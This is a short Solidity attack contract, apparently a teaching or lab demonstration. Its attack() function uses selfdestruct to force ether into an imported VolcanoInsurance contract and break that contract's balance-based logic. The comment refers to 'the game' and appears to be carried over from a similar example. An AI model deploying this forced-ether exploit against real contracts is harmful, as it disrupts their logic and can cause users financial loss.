// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./VolcanoInsuranceV40.sol";

contract SelfDestructSendOneEthereum {
    VolcanoInsurance VolcanoInsuranceInstance;

    constructor(VolcanoInsurance VolcanoInsuranceAddress) {
        VolcanoInsuranceInstance = VolcanoInsurance(VolcanoInsuranceAddress);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(VolcanoInsuranceInstance));
        selfdestruct(addr);
    }
}
